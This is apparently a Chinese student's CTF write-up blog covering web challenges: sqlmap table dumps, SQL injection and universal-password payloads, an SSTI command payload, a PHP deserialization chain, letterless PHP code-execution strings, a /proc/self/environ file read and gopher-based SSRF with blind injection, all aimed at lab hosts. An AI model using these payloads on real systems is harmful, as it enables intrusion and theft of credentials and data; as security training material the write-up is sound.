<li><p>没关系。。。看看数据库。。。<br><code>python sqlmap.py -u &quot;https://injection-perfection.acmcyber.com/&quot; --data=&quot;username=joe&amp;password=bruin&quot; -dbs</code><br>又是一堆乱糟糟的。。。没关系。。。。我乱搞一下</p>
</li>
<li><p>查一下表名吧<br><code>python sqlmap.py -u &quot;https://injection-perfection.acmcyber.com/&quot; --data=&quot;username=joe&amp;password=bruin&quot; --tables</code><br><img src="https://img.mjj.today/2023/03/03/e76bd4177bf31da151ddcafa748b9230.png" alt="e76bd4177bf31da151ddcafa748b9230.png"><br>所以数据库是<code>SQLite_masterdb</code>，表名是<code>users</code></p>
</li>
<li><p>查列名<code>python sqlmap.py -u &quot;https://injection-perfection.acmcyber.com/&quot; --data=&quot;username=joe&amp;password=bruin&quot; -T users --columns</code><br><img src="https://img.mjj.today/2023/03/03/5c7c9f0c6ad3c9ff1329e8e11ce3353f.png" alt="5c7c9f0c6ad3c9ff1329e8e11ce3353f.png"></p>
</li>
<li><p>查字段<code>python sqlmap.py -u &quot;https://injection-perfection.acmcyber.com/&quot; --data=&quot;username=joe&amp;password=bruin&quot; -T users -C fav_color,password,username --dump</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+----------+--------------------------------------+------------+</span><br><span class="line">| fav_color| password                             | username   |</span><br><span class="line">+----------+--------------------------------------+------------+</span><br><span class="line">| blue     | bruin                                | joe        |</span><br><span class="line">| red      | bedwarsplayersarelikefliesexceptflies| gamerboy80 |</span><br><span class="line">| flag&#123;**&#125; | *******                              | admin      |</span><br><span class="line">+----------+--------------------------------------+------------+</span><br></pre></td></tr></table></figure></li>
</ol>
<p>复现：<br>由</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">const attemptLogin <span class="operator">=</span> (username, password) <span class="operator">=</span><span class="operator">&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">new</span> Promise((resolve, reject) <span class="operator">=</span><span class="operator">&gt;</span> &#123;</span><br><span class="line">		db.get(`<span class="keyword">SELECT</span> username, password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;$&#123;username&#125;&#x27;</span>`, async (err, <span class="type">row</span>) <span class="operator">=</span><span class="operator">&gt;</span> &#123;</span><br><span class="line">			if (err)</span><br><span class="line">				<span class="keyword">return</span> reject(err);</span><br><span class="line">			<span class="keyword">else</span> if (<span class="type">row</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span> undefined)</span><br><span class="line">				<span class="keyword">return</span> reject(<span class="string">&#x27;Invalid User&#x27;</span>);</span><br><span class="line">			<span class="keyword">else</span> if (password <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span> row.password)</span><br><span class="line">				<span class="keyword">return</span> resolve(`My favorite color <span class="keyword">is</span> $&#123;await getFavColor(row.username)&#125;`);</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				<span class="keyword">return</span> reject(<span class="string">&#x27;incorrect password&#x27;</span>);</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>构建payload:<code>&quot;password=aaa&amp;username=a&#39; union select &#39;admin&#39;,&#39;aaa&#39; --+&quot;</code></p>
<h2 id="SQL-Prevention-101"><a href="#SQL-Prevention-101" class="headerlink" title="SQL Prevention-101"></a>SQL Prevention-101</h2><p>随便一个万能密码belike<code>admin&#39; or 1=1#</code></p>
<h2 id="What’s-on-the-Menu"><a href="#What’s-on-the-Menu" class="headerlink" title="What’s on the Menu?"></a>What’s on the Menu?</h2><ol>
<li>由题意得，bp打开，GET改成POST</li>
<li>由<code>Only the elite who used MenuBrowser can access the menu!</code>得，把<code>User-Agent</code>的值改为<code>MenuBrowser</code></li>
<li>由<code>Only those who were referred by https://yelp.com can access the menu!</code>得，加个请求头<code>Referer: https://yelp.com</code></li>
</ol>
<h2 id="Jester"><a href="#Jester" class="headerlink" title="Jester"></a>Jester</h2><p>已知是四位数加四位数，每一秒内都会换一道题。。。。所以算式的值会是从0到19999，如果用bp爆破一下从0到19999。。。。<br>那么一次撞大运能有1&#x2F;20000撞到，即19999&#x2F;20000的概率撞不到，撞20000次撞不到的概率为（19999&#x2F;20000）^20000 &#x3D; 0.36787<br>所以20000次能撞到数字正确的概率约为0.632.。。</p>
<p><img src="https://img.mjj.today/2023/03/03/5934296ab072814fe6041a8254562fd4.png" alt="5934296ab072814fe6041a8254562fd4.png"></p>
<p>然后把撞出来的页面show response in browser，看到第二题是一元二次方程，依旧是一秒换一题，然后因为式子只有加号所以方程的解为负，而且四舍五入为整数，所以以两个解的值在-100到0再次爆破一下<br><img src="https://img.mjj.today/2023/03/03/1605e8817747775932563f3e2621ea78.png" alt="1605e8817747775932563f3e2621ea78.png"><br>emmmmmmm…</p>
<p>然后其实我本来的思路是写个Python，读取页面然后解方程式，Python跑的速度加传参的速度，有几率在1秒内跑完并且传参<br>然后我代码都搞到了改完了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="comment"># 发送HTTP请求并解析HTML</span></span><br><span class="line">url = <span class="string">&quot;https://jester.acmcyber.com/validate&quot;</span></span><br><span class="line">response = requests.get(url)</span><br><span class="line">soup = BeautifulSoup(response.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line"><span class="comment"># 找到所有的&lt;p&gt;标签并获取包含算式的文本内容</span></span><br><span class="line">p_tags = soup.find_all(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">text = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> p_tags:</span><br><span class="line">    <span class="keyword">match</span> = re.search(<span class="string">r&#x27;(\d+)\s*\+\s*(\d+)&#x27;</span>, p.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        text = <span class="keyword">match</span>.group(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># 使用eval()函数计算算式的结果</span></span><br><span class="line"><span class="keyword">if</span> text:</span><br><span class="line">    operands = [<span class="built_in">int</span>(op) <span class="keyword">for</span> op <span class="keyword">in</span> text.split(<span class="string">&quot; + &quot;</span>)]</span><br><span class="line">    result = <span class="built_in">sum</span>(operands)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;算式:&quot;</span>, text)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;结果:&quot;</span>, result)</span><br><span class="line">    <span class="comment"># 将结果POST到表单中</span></span><br><span class="line">    form_data = &#123;<span class="string">&quot;answer&quot;</span>: <span class="built_in">str</span>(result)&#125;</span><br><span class="line">    response = requests.post(url, data=form_data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;已将结果POST到表单中！&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;未找到算式！&quot;</span>)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">soup = BeautifulSoup(response.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line"><span class="comment"># 找到所有的&lt;p&gt;标签并获取包含算式的文本内容</span></span><br><span class="line">p_tags = soup.find_all(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">text = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> p_tags:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;What are the roots of&quot;</span> <span class="keyword">in</span> p.text:</span><br><span class="line">        text = p.text.strip()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># 解析算式并计算结果</span></span><br><span class="line"><span class="keyword">if</span> text:</span><br><span class="line">    <span class="comment"># 使用正则表达式匹配算式中的系数</span></span><br><span class="line">    pattern = <span class="string">r&#x27;(\d+)\s*x\^2\s*\+\s*(\d+)\s*x\s*\+\s*(\d+)&#x27;</span></span><br><span class="line">    <span class="keyword">match</span> = re.search(pattern, text)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        a, b, c = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>)), <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">2</span>)), <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">3</span>))</span><br><span class="line">        <span class="comment"># 计算一元二次方程的解</span></span><br><span class="line">        delta = b**<span class="number">2</span> - <span class="number">4</span>*a*c</span><br><span class="line">        <span class="keyword">if</span> delta &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;无实数解！&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> delta == <span class="number">0</span>:</span><br><span class="line">            x = -b / (<span class="number">2</span>*a)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;唯一实数解：&quot;</span>, x)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x1 = (-b + delta**<span class="number">0.5</span>) / (<span class="number">2</span>*a)</span><br><span class="line">            x2 = (-b - delta**<span class="number">0.5</span>) / (<span class="number">2</span>*a)</span><br><span class="line">            x1_rounded = <span class="built_in">round</span>(x1)</span><br><span class="line">            x2_rounded = <span class="built_in">round</span>(x2)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;两个实数解：&quot;</span>, x1_rounded, x2_rounded)</span><br><span class="line">        <span class="comment"># 将解POST到表单中</span></span><br><span class="line">        form_data = &#123;<span class="string">&quot;answer&quot;</span>: <span class="built_in">str</span>(result),<span class="string">&quot;answer1&quot;</span>: <span class="built_in">str</span>(x1_rounded), <span class="string">&quot;answer2&quot;</span>: <span class="built_in">str</span>(x2_rounded)&#125;</span><br><span class="line">        response = requests.post(url+<span class="string">&quot;&quot;</span>, data=form_data)</span><br><span class="line">        <span class="comment"># 输出POST请求后的HTML源代码</span></span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;算式格式不正确！&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;未找到算式！&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>平均速度在0.7秒到1.7秒内。。多跑几次就可以跑出来，然而出现了一个问题。。.<br>因为两题的URL是同一个，所以每次post answer1和answer2都会post到第一题上去（悲<br>potato说是第二题比第一题多个cookie，而Python好像没法区分，然后我寻思如果python再传一个cookie请求头会不会超出一秒（而且也太麻烦了我不会写<br>遂作罢。。。。。。</p>
<p>学长的代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;https://jester.acmcyber.com/validate&quot;</span></span><br><span class="line">session = requests.Session()</span><br><span class="line">ssss = session.get(url=url)</span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(ssss.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">addition_problem = soup.find(<span class="string">&#x27;p&#x27;</span>, text=<span class="keyword">lambda</span> x: <span class="string">&#x27;What is&#x27;</span> <span class="keyword">in</span> x <span class="keyword">and</span> <span class="string">&#x27;+&#x27;</span> <span class="keyword">in</span> x)</span><br><span class="line">addition_str = addition_problem.text.strip().replace(<span class="string">&#x27;What is &#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;?&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&#x27;</span>).strip().split(<span class="string">&#x27; + &#x27;</span>)</span><br><span class="line">res = <span class="built_in">int</span>(addition_str[<span class="number">0</span>])+<span class="built_in">int</span>(addition_str[<span class="number">1</span>])</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;answer&quot;</span>:<span class="built_in">str</span>(res)</span><br><span class="line">&#125;</span><br><span class="line">ssss = session.post(url=url,data=data)</span><br><span class="line"><span class="built_in">print</span>(ssss.text)</span><br><span class="line"><span class="built_in">print</span>(ssss.headers)</span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(ssss.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">question = soup.find_all(<span class="string">&#x27;p&#x27;</span>)[<span class="number">1</span>].text</span><br><span class="line"><span class="built_in">print</span>(question.split(<span class="string">&#x27; &#x27;</span>))</span><br><span class="line">expression = question.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">a = <span class="built_in">int</span>(expression[<span class="number">5</span>])</span><br><span class="line">b = <span class="built_in">int</span>(expression[<span class="number">8</span>])</span><br><span class="line">c = <span class="built_in">int</span>(expression[<span class="number">11</span>])</span><br><span class="line"><span class="built_in">print</span>(a,b,c)</span><br><span class="line">D = b**<span class="number">2</span> - <span class="number">4</span>*a*c</span><br><span class="line"><span class="keyword">if</span> D &lt; <span class="number">0</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;无实数根&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    root1 = (-b + D**<span class="number">0.5</span>) / (<span class="number">2</span>*a)</span><br><span class="line">    root2 = (-b - D**<span class="number">0.5</span>) / (<span class="number">2</span>*a)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;解：&#x27;</span>, <span class="built_in">round</span>(root1), <span class="built_in">round</span>(root2))</span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&quot;answer1&quot;</span>:<span class="built_in">str</span>(<span class="built_in">round</span>(root1)),</span><br><span class="line">    <span class="string">&quot;answer2&quot;</span>:<span class="built_in">str</span>(<span class="built_in">round</span>(root2))</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">ssss = session.post(url=url,data=data)</span><br><span class="line"><span class="built_in">print</span>(ssss.text)</span><br><span class="line"><span class="built_in">print</span>(ssss.headers)</span><br></pre></td></tr></table></figure>

<p>知道了Session()可以保存cookie，改了一下自己的👉👈</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="comment"># 发送HTTP请求并解析HTML</span></span><br><span class="line">url = <span class="string">&quot;https://jester.acmcyber.com/validate&quot;</span></span><br><span class="line">session = requests.Session()</span><br><span class="line">response = session.get(url=url)</span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(response.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line"><span class="comment"># 找到所有的&lt;p&gt;标签并获取包含算式的文本内容</span></span><br><span class="line">p_tags = soup.find_all(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">text = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> p_tags:</span><br><span class="line">    <span class="keyword">match</span> = re.search(<span class="string">r&#x27;(\d+)\s*\+\s*(\d+)&#x27;</span>, p.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        text = <span class="keyword">match</span>.group(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># 使用eval()函数计算算式的结果</span></span><br><span class="line"><span class="keyword">if</span> text:</span><br><span class="line">    operands = [<span class="built_in">int</span>(op) <span class="keyword">for</span> op <span class="keyword">in</span> text.split(<span class="string">&quot; + &quot;</span>)]</span><br><span class="line">    result = <span class="built_in">sum</span>(operands)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;算式:&quot;</span>, text)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;结果:&quot;</span>, result)</span><br><span class="line">    <span class="comment"># 将结果POST到表单中</span></span><br><span class="line">    form_data = &#123;</span><br><span class="line">        <span class="string">&quot;answer&quot;</span>: <span class="built_in">str</span>(result)</span><br><span class="line">    &#125;</span><br><span class="line">    response = session.post(url, data=form_data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;已将结果POST到表单中！&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;未找到算式！&quot;</span>)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">response = session.post(url=url,data=form_data)</span><br><span class="line">soup = BeautifulSoup(response.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line"><span class="comment"># 找到所有的&lt;p&gt;标签并获取包含算式的文本内容</span></span><br><span class="line">p_tags = soup.find_all(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">text = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> p_tags:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;What are the roots of&quot;</span> <span class="keyword">in</span> p.text:</span><br><span class="line">        text = p.text.strip()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># 解析算式并计算结果</span></span><br><span class="line"><span class="keyword">if</span> text:</span><br><span class="line">    <span class="comment"># 使用正则表达式匹配算式中的系数</span></span><br><span class="line">    pattern = <span class="string">r&#x27;(\d+)\s*x\^2\s*\+\s*(\d+)\s*x\s*\+\s*(\d+)&#x27;</span></span><br><span class="line">    <span class="keyword">match</span> = re.search(pattern, text)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        a, b, c = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>)), <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">2</span>)), <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">3</span>))</span><br><span class="line">        <span class="comment"># 计算一元二次方程的解</span></span><br><span class="line">        delta = b**<span class="number">2</span> - <span class="number">4</span>*a*c</span><br><span class="line">        <span class="keyword">if</span> delta &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;无实数解！&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> delta == <span class="number">0</span>:</span><br><span class="line">            x = -b / (<span class="number">2</span>*a)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;唯一实数解：&quot;</span>, x)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x1 = (-b + delta**<span class="number">0.5</span>) / (<span class="number">2</span>*a)</span><br><span class="line">            x2 = (-b - delta**<span class="number">0.5</span>) / (<span class="number">2</span>*a)</span><br><span class="line">            x1_rounded = <span class="built_in">round</span>(x1)</span><br><span class="line">            x2_rounded = <span class="built_in">round</span>(x2)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;两个实数解：&quot;</span>, x1_rounded, x2_rounded)</span><br><span class="line">        <span class="comment"># 将解POST到表单中</span></span><br><span class="line">        form_data = &#123;</span><br><span class="line">            <span class="string">&quot;answer1&quot;</span>: <span class="built_in">str</span>(x1_rounded),</span><br><span class="line">            <span class="string">&quot;answer2&quot;</span>: <span class="built_in">str</span>(x2_rounded)</span><br><span class="line">        &#125;</span><br><span class="line">        response = session.post(url=url, data=form_data)</span><br><span class="line">        <span class="comment"># 输出POST请求后的HTML源代码</span></span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;算式格式不正确！&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;未找到算式！&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="Simple-Calculator"><a href="#Simple-Calculator" class="headerlink" title="Simple Calculator"></a>Simple Calculator</h2><p>在学长给的<code>/proc</code>提示下，<code>https://simple-calculator.acmcyber.com/source?file=/proc/self/environ</code></p>
]]></content>
      <categories>
        <category>做题记录</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>ROIS冬令营第三周至第五周WriteUp</title>
    <url>/2023/02/15/ROIS%E5%86%AC%E4%BB%A4%E8%90%A5%E7%AC%AC%E4%B8%89%E5%91%A8%E8%87%B3%E7%AC%AC%E4%BA%94%E5%91%A8WriteUp/</url>
    <content><![CDATA[<p>ROIS冬令营第三周至第五周WriteUp（更了misc的两题</p>
<span id="more"></span>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Week3-SSTItest"><a href="#Week3-SSTItest" class="headerlink" title="[Week3]SSTItest"></a>[Week3]SSTItest</h3><p>payload：<code>username=&#123;&#123;lipsum.__globals__["os"].popen("tac ../flag").read()&#125;&#125;&amp;password=1</code></p>
<h3 id="LinTu的留言板sql注入"><a href="#LinTu的留言板sql注入" class="headerlink" title="LinTu的留言板sql注入"></a>LinTu的留言板sql注入</h3><p>测试（以下第一行都在id处输入，第二行都在留言处输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;,&#x27;2&#x27;)#</span><br><span class="line">11</span><br></pre></td></tr></table></figure>
<p>输出：<code>1 说 2</code></p>
<p>查当前库名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;,database())#</span><br><span class="line">11</span><br></pre></td></tr></table></figure>
<p>输出：<code>1 说 test</code></p>
<p>查库名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;,(select group_concat(schema_name) from information_schema.schemata))#</span><br><span class="line">11</span><br></pre></td></tr></table></figure>
<p>输出：<code>1 说 mysql,information_schema,performance_schema,sys,sakila,world,test</code></p>
<p>查表名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;test&#x27;))#</span><br><span class="line">11</span><br></pre></td></tr></table></figure>
<p>输出：<code>1 说 guestbook,user</code></p>
<p>查字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;,(select group_concat(concat_ws(&#x27;:&#x27;,username,password)) from test.user))#</span><br><span class="line">11</span><br></pre></td></tr></table></figure>
<p>输出admin及其密码</p>
<h3 id="Week4-babyphp"><a href="#Week4-babyphp" class="headerlink" title="[Week4]babyphp"></a>[Week4]babyphp</h3><p>刚开头给的函数是backdoor函数，传入六个参数，但是在下面的代码里面，除了在popko类中，其他的并没有调用这个backdoor函数<br>由题意得，我们应该用到这个backdoor函数</p>
<p>按顺序捋捋应该是：</p>
<ol>
<li>首先是传入一个c，当c中不包含字符串<code>popko</code>，就会反序列化c中的字符串；</li>
<li>反序列化后会调用popko类中的__destruct函数；</li>
<li>popko类中的__destruct函数中又会调用pipimi类中的__destruct函数；</li>
<li>__destruct函数中会调用backdoor函数；</li>
</ol>
<hr>
<ol>
<li><p>首先，构造一个可以被反序列化的字符串c，利用反序列化漏洞，构造一个可以调用backdoor()函数的对象，利用 Popko 类，Popko类有一个 __call() 函数，当left和right值相同，且md5和sha1值相同，它会调用backdoor()函数。</p>
</li>
<li><p>然后，利用 pipimi 类，构造一个可以调用 Popko 类的对象，利用 pipimi 类来构造，调用 Popko 类的 a 函数，从而调用 Popko 类的 __call() 函数。</p>
</li>
<li><p>然后，构造出c后就可以调用backdoor()函数；</p>
</li>
</ol>
<p>构造c</p>
<ol>
<li>传入popkp：php是一种弱语言，strstr()对大小写敏感，可以用Popko大写绕过这样。。</li>
<li>left和right值相同，且md5和sha1值相同：数组传参；</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$popko=new popko();</span><br><span class="line">$pipimi=new pipimi();</span><br><span class="line">$right[]=1;</span><br><span class="line">$left[]=2;</span><br><span class="line">$popko-&gt;right=$right;</span><br><span class="line">$popko-&gt;left=$left;</span><br><span class="line">$pipimi-&gt;a=$popko;</span><br><span class="line">echo serialize($pipimi);</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>得到<code>O:6:&quot;pipimi&quot;:1:&#123;s:1:&quot;a&quot;;O:5:&quot;popko&quot;:2:&#123;s:4:&quot;left&quot;;a:1:&#123;i:0;i:2;&#125;s:5:&quot;right&quot;;a:1:&#123;i:0;i:1;&#125;&#125;&#125;</code>改<code>POPKO</code></li>
<li>绕过__wakeup()：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行，2改3；</li>
<li>成功调用backdoor函数。</li>
</ol>
<hr>
<ol>
<li><p><code>&amp;a=Error</code>Error类；</p>
</li>
<li><p><code>&amp;b=systemcat%20/f*</code>指定b的值为systemcat &#x2F;f*，这是一个命令，它会搜索当前目录下所有以.f结尾的文件。</p>
</li>
<li><p><code>&amp;d=7&amp;e=6&amp;f=13&amp;g=7</code>指定d，e，f和g的值为7，6，13和7，它们是用来指定Popko类的实例的left和right属性的字符串长度的。</p>
</li>
</ol>
<p><code>?c=O:6:&quot;pipimi&quot;:1:&#123;s:1:&quot;a&quot;;O:5:&quot;POPKO&quot;:3:&#123;s:4:&quot;left&quot;;a:1:&#123;i:0;i:1;&#125;s:5:&quot;right&quot;;a:1:&#123;i:0;i:2;&#125;&#125;&#125;&amp;a=Error&amp;b=systemcat%20/f*&amp;d=7&amp;e=6&amp;f=13&amp;g=7</code></p>
<h3 id="Week4-cachewaf"><a href="#Week4-cachewaf" class="headerlink" title="[Week4]cachewaf"></a>[Week4]cachewaf</h3><p>&#96;cmd&#x3D;system(‘ls’);发现被过滤，经过测试是system被过滤。</p>
<p>搜个无数字字母rce的，<code>cmd=$%DF=(_/_._)[0];$_=%2B%2B$%DF ;$%DE=_;$%DE.=%2B%2B$_.$%DF;$_%2B%2B ;$_%2B%2B;$%DE.=%2B%2B$_;$%DE.=%2B%2B$_;$$%DE [0]($$%DE [_]);&amp;0=system&amp;_=echo 1111;</code></p>
<p>然后<code>cmd=$%DF=(_/_._)[0];$_=%2B%2B$%DF ;$%DE=_;$%DE.=%2B%2B$_.$%DF;$_%2B%2B ;$_%2B%2B;$%DE.=%2B%2B$_;$%DE.=%2B%2B$_;$$%DE [0]($$%DE [_]);&amp;0=system&amp;_=ls /</code>把&#x2F;目录下的文件和目录列出来。</p>
<p>但是在<code>cmd=$%DF=(_/_._)[0];$_=%2B%2B$%DF ;$%DE=_;$%DE.=%2B%2B$_.$%DF;$_%2B%2B ;$_%2B%2B;$%DE.=%2B%2B$_;$%DE.=%2B%2B$_;$$%DE [0]($$%DE [_]);&amp;0=system&amp;_=cat /f*</code>提取flag时，flag是错的。</p>
<p>输入<code>cmd=$%DF=(_/_._)[0];$_=%2B%2B$%DF ;$%DE=_;$%DE.=%2B%2B$_.$%DF;$_%2B%2B ;$_%2B%2B;$%DE.=%2B%2B$_;$%DE.=%2B%2B$_;$$%DE [0]($$%DE [_]);&amp;0=system&amp;_=cat waf*</code>发现flag会被替换并且被编码。</p>
<p>。。。然后。。。利用shelI写文件绕过waf这部分还在捋捋。。。但是看到了wp给出的非预期解（？）。。。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=echo `ls /`;</span><br><span class="line">cmd=echo `cat /f?ag`;</span><br><span class="line">cmd=echo bin2hex(`cat /f?ag`);</span><br></pre></td></tr></table></figure>
<p>然后hex解一下就好</p>
<h3 id="Week4-internal"><a href="#Week4-internal" class="headerlink" title="[Week4]internal"></a>[Week4]internal</h3><p>由sqli可以知道真实的地址要在它服务端本地发出的，才能够进行sql查询。。<br>由ssrf提示可得，可以利用gopher协议，构造一个数据包然后传进去，使服务器以为是本地发送的请求。<br>构建如下：<br><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2</code></p>
<p>然后利用id进行传参。。</p>
<p>空格可以用<code>/**/</code>替换，但是不知道为什么我<code>&quot;un&quot;+&quot;ion&quot;</code>构建不成功，试了大小写双写内联注释URL编码都不行。。。好吧只能一个一个布尔盲注一下<br><strong>查库名</strong><br>库名长度为3<br><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/(length(database())=3)</code></p>
<p>库名第一个字符ASCII值为114(r)<br><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/(ASCII(SUBSTR(database(),1,1))=114)</code></p>
